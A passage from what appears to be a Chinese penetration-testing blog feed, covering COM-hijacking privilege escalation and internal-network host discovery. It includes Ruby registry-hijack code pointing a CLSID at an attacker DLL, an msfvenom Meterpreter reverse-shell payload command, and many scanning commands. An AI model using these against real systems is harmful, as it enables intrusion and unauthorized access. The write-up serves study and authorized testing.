class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijack_com</span><span class="params">(registry_view, dll_path)</span></span></span><br><span class="line">    target = @@hijack_points.sample</span><br><span class="line">    target_clsid = target[<span class="symbol">:class_ids</span>].sample</span><br><span class="line">    root_key = <span class="string">"<span class="subst">#&#123;CLSID_PATH&#125;</span>\\&#123;<span class="subst">#&#123;target_clsid&#125;</span>&#125;"</span></span><br><span class="line">    inproc_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\InProcServer32"</span></span><br><span class="line">    shell_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\ShellFolder"</span></span><br><span class="line"></span><br><span class="line">    registry_createkey(root_key, registry_view)</span><br><span class="line">    registry_createkey(inproc_key, registry_view)</span><br><span class="line">    registry_createkey(shell_key, registry_view)</span><br><span class="line">   </span><br><span class="line">    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'ThreadingModel'</span>, <span class="string">'Apartment'</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'LoadWithoutCOM'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'HideOnDesktop'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'Attributes'</span>, <span class="number">0xf090013d</span>, <span class="string">'REG_DWORD'</span>, registry_view)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span>     target[<span class="symbol">:name</span>],</span><br><span class="line">      <span class="symbol">cmd_path:</span> target[<span class="symbol">:cmd_path</span>],</span><br><span class="line">      <span class="symbol">cmd_args:</span> target[<span class="symbol">:cmd_args</span>],</span><br><span class="line">      <span class="symbol">root_key:</span> root_key</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ÂêëÊ≥®ÂÜåË°®Ê∑ªÂä†</p><blockquote><p>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32<br>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</p></blockquote><p>InProcServer ‰∏≠Ôºö</p><ul><li>Default -&gt; dll_path</li><li>ThreadingModel -&gt; Apartment</li><li>LoadWithoutCOM -&gt; Null</li></ul><p>ShellFolder ‰∏≠Ôºö</p><ul><li>HideOnDesktop -&gt; Null</li><li>Attributes -&gt; 0xf090013d</li></ul><h2 id="0x03-Â§çÁé∞"><a href="#0x03-Â§çÁé∞" class="headerlink" title="0x03 Â§çÁé∞"></a>0x03 Â§çÁé∞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe</span><br></pre></td></tr></table></figure><p><img src="/Êó†Ê†áÈ¢ò.resources/0E2986DD-BCFB-443E-AFB1-884B8BBB60EF.png" alt="7b0554d147b29f2ea26ae50de761fd1a"><br>ÂõûÂºπÊãøÂà∞meterpreter session</p><p><img src="/Êó†Ê†áÈ¢ò.resources/14E6038F-66BC-4AD3-9AC5-60A3B370D8A3.png" alt="2e3c6b217fb1c0f6eb5ee8e7e645c081"></p><p>Êó†Ê≥ïgetsystem</p><p><img src="/Êó†Ê†áÈ¢ò.resources/F2BE433B-9D87-4A45-925C-701F6E351B27.png" alt="141b1b876500404f9687d93866b5a8e2"></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂä´ÊåÅ‰∫ÜCLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}ÁöÑ‰ºöËØùÔºåÊàêÂäüÊãøÂà∞ÂèçÂºπsession</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-ComÂä´ÊåÅÂéüÁêÜ&quot;&gt;&lt;a href=&quot;#0x01-ComÂä´ÊåÅÂéüÁêÜ&quot; class=&quot;headerlink&quot; title=&quot;0x01 ComÂä´ÊåÅÂéüÁêÜ&quot;&gt;&lt;/a&gt;0x01 ComÂä´ÊåÅÂéüÁêÜ&lt;/h2&gt;&lt;p&gt;Âà©Áî®CLSIDÊêúÁ¥¢È°∫Â∫èÔºö&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HKCU
      
    
    </summary>
    
    
      <category term="ÂÜÖÁΩëÊ∏óÈÄè" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞</title>
    <link href="http://patrilic.top/2019/04/03/%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
    <id>http://patrilic.top/2019/04/03/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞/</id>
    <published>2019-04-03T03:59:32.000Z</published>
    <updated>2019-07-08T15:44:38.387Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x01-ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫"><a href="#0x01-ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫" class="headerlink" title="0x01 ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫"></a>0x01 ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫</h2><h3 id="1-1-Âü∫‰∫éARPÂèëÁé∞ÂÜÖÁΩë‰∏ªÊú∫"><a href="#1-1-Âü∫‰∫éARPÂèëÁé∞ÂÜÖÁΩë‰∏ªÊú∫" class="headerlink" title="1.1 Âü∫‰∫éARPÂèëÁé∞ÂÜÖÁΩë‰∏ªÊú∫"></a>1.1 Âü∫‰∫éARPÂèëÁé∞ÂÜÖÁΩë‰∏ªÊú∫</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR 10.253.6.0/24</span><br></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Patrilic\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot;</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/F4D8B735-47A4-47AE-8C52-6EC48D0A494D.png" alt="b535427cfa8bff645f941c761de208ee"></p><p>Invoke-ARPScan ÊòØEmpire‰∏≠ÁöÑÊ®°Âùó</p><h4 id="arp-scan-exe"><a href="#arp-scan-exe" class="headerlink" title="arp-scan.exe"></a>arp-scan.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">scan.exe</span> -<span class="title">t</span> 192.168.121.0/24</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/B32AA3E3-6152-4659-A9B3-9D90AF18DB15.png" alt="1f8e2f46692be0db78c4aa872061312c"></p><h4 id="arp-ping-exe"><a href="#arp-ping-exe" class="headerlink" title="arp-ping.exe"></a>arp-ping.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">ping.exe</span> 192.168.121.1</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/F9D157F9-667C-4A56-A2E1-84A0B9E89B14.png" alt="017bf04412ca847df46101caadf1c928"></p><h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.3.0/24 -i eth0</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/505FE0B8-6242-4894-ACEA-F131AFC3DFC9.png" alt="f40948147bbe5919da12d82a559b56d9"></p><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/012C3ADD-CD53-42DE-B40E-8459DB9382CC.png" alt="6189badfb2a72fed6459edba892064ba"></p><h4 id="CainÁ≠â"><a href="#CainÁ≠â" class="headerlink" title="CainÁ≠â"></a>CainÁ≠â</h4><h3 id="1-2-Âü∫‰∫éicmpÂèëÁé∞‰∏ªÊú∫"><a href="#1-2-Âü∫‰∫éicmpÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.2 Âü∫‰∫éicmpÂèëÁé∞‰∏ªÊú∫"></a>1.2 Âü∫‰∫éicmpÂèëÁé∞‰∏ªÊú∫</h3><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">for</span> /<span class="title">L</span> %<span class="title">I</span> <span class="title">in</span> (1,1,254) <span class="title">DO</span> @<span class="title">ping</span> -<span class="title">w</span> 1 -<span class="title">n</span> 1 192.168.121.%<span class="title">I</span> | <span class="title">findstr</span> "<span class="title">TTL</span>="</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/11FE87F8-DFC5-4F24-A6AE-59B567853401.png" alt="96cb8bb61bf9e88c2a3a7bda7547807d"></p><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE 192.168.3.0/24</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/193C3160-17B2-4BB2-A178-0115E0326584.jpg" alt="89c3bc440d2446f15121c4bcce576ca9"></p><h4 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000"</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/F9F443E0-8516-4F3A-9036-369D557F9743.png" alt="cf17177493ff1f7678825dca8a46b76c"></p><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 10.131.36.&#123;1..254&#125; </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">   ping <span class="variable">$ip</span> -c 1 &amp;&gt; /dev/null </span><br><span class="line">   <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ip</span> is alive .... </span><br><span class="line">   <span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/AD2CCDBE-6B28-4064-8129-BD3DE928C01C.png" alt="573f9b41753a8eb36b56b062c2aa1fab"></p><h3 id="1-3-Âü∫‰∫énetbiosÂçèËÆÆÂèëÁé∞‰∏ªÊú∫"><a href="#1-3-Âü∫‰∫énetbiosÂçèËÆÆÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.3 Âü∫‰∫énetbiosÂçèËÆÆÂèëÁé∞‰∏ªÊú∫"></a>1.3 Âü∫‰∫énetbiosÂçèËÆÆÂèëÁé∞‰∏ªÊú∫</h3><h4 id="cmd-1"><a href="#cmd-1" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtstat -n</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/9F50A42F-3516-4BA2-9C40-BA246B49B226.png" alt="ae9d6dd415b464302a342a0e9b30c5c4"></p><h4 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan-1.0.35.exe -m 192.168.121.0/24</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/D0C9CDA1-7F52-4888-BAF3-A3CAC81214BC.png" alt="6a39cc10cd8c0f7b2a96d570c03d811a"></p><h4 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/31F8DB2A-6859-444C-B91B-E1FDA3090859.png" alt="b7d36bfa324e4c6fecc134c750ec6f82"></p><h3 id="1-4-Âü∫‰∫ésmbÂçèËÆÆÂèëÁé∞‰∏ªÊú∫"><a href="#1-4-Âü∫‰∫ésmbÂçèËÆÆÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.4 Âü∫‰∫ésmbÂçèËÆÆÂèëÁé∞‰∏ªÊú∫"></a>1.4 Âü∫‰∫ésmbÂçèËÆÆÂèëÁé∞‰∏ªÊú∫</h3><h4 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‚ÄêsU ‚ÄêsS ‚Äê‚Äêscript smb‚Äêenum‚Äêshares.nse ‚Äêp445 192.168.1.119/24</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/795DA407-659D-418D-A180-B10BB210C477.png" alt="856a0cc32348f1b49cb80a4a98303498"></p><h4 id="cmd-2"><a href="#cmd-2" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %a <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> <span class="built_in">start</span> /min /low telnet <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%a <span class="number">445</span></span><br></pre></td></tr></table></figure><h4 id="powershell-2"><a href="#powershell-2" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">445</span>|%&#123;echo((new‚ÄêobjectNet.Sockets.TcpClient).Connect(<span class="string">"10.253.6"</span>,<span class="variable">$_</span>)) <span class="string">"<span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">5</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;<span class="number">445</span>|%&#123;echo((new‚Äêobject Net.Sockets.TcpClient).Connect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">118</span>..<span class="number">119</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;write‚Äêhost<span class="string">"‚Äê‚Äê‚Äê‚Äê‚Äê‚Äê"</span>;write‚Äêhost <span class="string">"192.168.1.<span class="variable">$a</span>"</span>; <span class="number">80</span>,<span class="number">445</span> | % &#123;echo ((new‚Äêobject Net.Sockets.TcpClient).Con ect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="1-5-Âü∫‰∫ésnmpÂèëÁé∞‰∏ªÊú∫"><a href="#1-5-Âü∫‰∫ésnmpÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.5 Âü∫‰∫ésnmpÂèëÁé∞‰∏ªÊú∫"></a>1.5 Âü∫‰∫ésnmpÂèëÁé∞‰∏ªÊú∫</h3><h4 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/62BB742B-9540-49B3-AEDB-1490A53D6143.png" alt="54f953ba0bf35bbe34623e0138e3f017"></p><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p><a href="https://github.com/dheiland-r7/snmp" target="_blank" rel="noopener">https://github.com/dheiland-r7/snmp</a><br><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/BE732D1F-6E9E-4B2A-8015-395F33CCE0A2.png" alt="7f535a08c8897275f57fb979975b1b8c"></p><h3 id="1-6-Âü∫‰∫éudpÂèëÁé∞‰∏ªÊú∫"><a href="#1-6-Âü∫‰∫éudpÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.6 Âü∫‰∫éudpÂèëÁé∞‰∏ªÊú∫"></a>1.6 Âü∫‰∫éudpÂèëÁé∞‰∏ªÊú∫</h3><h4 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500</span><br></pre></td></tr></table></figure><h4 id="unicornscan"><a href="#unicornscan" class="headerlink" title="unicornscan"></a>unicornscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.1.100</span><br></pre></td></tr></table></figure><h3 id="1-7-Âü∫‰∫éSqlDataSourceEnumerator"><a href="#1-7-Âü∫‰∫éSqlDataSourceEnumerator" class="headerlink" title="1.7 Âü∫‰∫éSqlDataSourceEnumerator"></a>1.7 Âü∫‰∫éSqlDataSourceEnumerator</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br></pre></td></tr></table></figure><p><img src="/ÂÜÖÁΩë‰∏ªÊú∫ÂèëÁé∞.resources/F69B4159-B3B4-4DDE-B4A3-BD483E8C1431.png" alt="db8c4d18ffad131d9641044e575fc820"></p><h3 id="1-8-Âü∫‰∫émsfÂèëÁé∞‰∏ªÊú∫"><a href="#1-8-Âü∫‰∫émsfÂèëÁé∞‰∏ªÊú∫" class="headerlink" title="1.8 Âü∫‰∫émsfÂèëÁé∞‰∏ªÊú∫"></a>1.8 Âü∫‰∫émsfÂèëÁé∞‰∏ªÊú∫</h3><h4 id="httpÊúçÂä°"><a href="#httpÊúçÂä°" class="headerlink" title="httpÊúçÂä°"></a>httpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/http_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/title</span><br></pre></td></tr></table></figure><h4 id="smbÊúçÂä°"><a href="#smbÊúçÂä°" class="headerlink" title="smbÊúçÂä°"></a>smbÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure><h4 id="ftpÊúçÂä°"><a href="#ftpÊúçÂä°" class="headerlink" title="ftpÊúçÂä°"></a>ftpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous</span><br></pre></td></tr></table></figure><h4 id="arpÊúçÂä°"><a href="#arpÊúçÂä°" class="headerlink" title="arpÊúçÂä°"></a>arpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure><h4 id="udpÊúçÂä°"><a href="#udpÊúçÂä°" class="headerlink" title="udpÊúçÂä°"></a>udpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><h4 id="sshÊúçÂä°"><a href="#sshÊúçÂä°" class="headerlink" title="sshÊúçÂä°"></a>sshÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure><h4 id="telnetÊúçÂä°"><a href="#telnetÊúçÂä°" class="headerlink" title="telnetÊúçÂä°"></a>telnetÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/telnet/telnet_version</span><br></pre></td></tr></table></figure><h4 id="dnsÊúçÂä°"><a href="#dnsÊúçÂä°" class="headerlink" title="dnsÊúçÂä°"></a>dnsÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/dns/dns_amp</span><br></pre></td></tr></table></figure><h4 id="mysqlÊúçÂä°"><a href="#mysqlÊúçÂä°" class="headerlink" title="mysqlÊúçÂä°"></a>mysqlÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_version</span><br></pre></td></tr></table></figure><h4 id="netbiosÊúçÂä°"><a href="#netbiosÊúçÂä°" class="headerlink" title="netbiosÊúçÂä°"></a>netbiosÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure><h4 id="db2ÊúçÂä°"><a href="#db2ÊúçÂä°" class="headerlink" title="db2ÊúçÂä°"></a>db2ÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/db2/db2_version</span><br></pre></td></tr></table></figure><h4 id="Á´ØÂè£ÂèëÁé∞"><a href="#Á´ØÂè£ÂèëÁé∞" class="headerlink" title="Á´ØÂè£ÂèëÁé∞"></a>Á´ØÂè£ÂèëÁé∞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ftpbounce</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure><h4 id="rdpÊúçÂä°"><a href="#rdpÊúçÂä°" class="headerlink" title="rdpÊúçÂä°"></a>rdpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rdp/rdp_scanner</span><br></pre></td></tr></table></figure><h4 id="smtpÊúçÂä°"><a href="#smtpÊúçÂä°" class="headerlink" title="smtpÊúçÂä°"></a>smtpÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smtp/smtp_version</span><br></pre></td></tr></table></figure><h4 id="pop3ÊúçÂä°"><a href="#pop3ÊúçÂä°" class="headerlink" title="pop3ÊúçÂä°"></a>pop3ÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/pop3/pop3_version</span><br></pre></td></tr></table></figure><h4 id="posgresÊúçÂä°"><a href="#posgresÊúçÂä°" class="headerlink" title="posgresÊúçÂä°"></a>posgresÊúçÂä°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/postgres/postgres_version</span><br></pre></td></tr></table></figure><h4 id="Ë∞ÉÁî®nmap"><a href="#Ë∞ÉÁî®nmap" class="headerlink" title="Ë∞ÉÁî®nmap"></a>Ë∞ÉÁî®nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap</span><br></pre></td></tr></table></figure><h4 id="postÁªÑ‰ª∂"><a href="#postÁªÑ‰ª∂" class="headerlink" title="postÁªÑ‰ª∂"></a>postÁªÑ‰ª∂</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">windows/gather/arp_scanner </span><br><span class="line">windows/gather/enum_ad_computers </span><br><span class="line">windows/gather/enum_computers </span><br><span class="line">windows/gather/enum_domain </span><br><span class="line">windows/gather/enum_domains </span><br><span 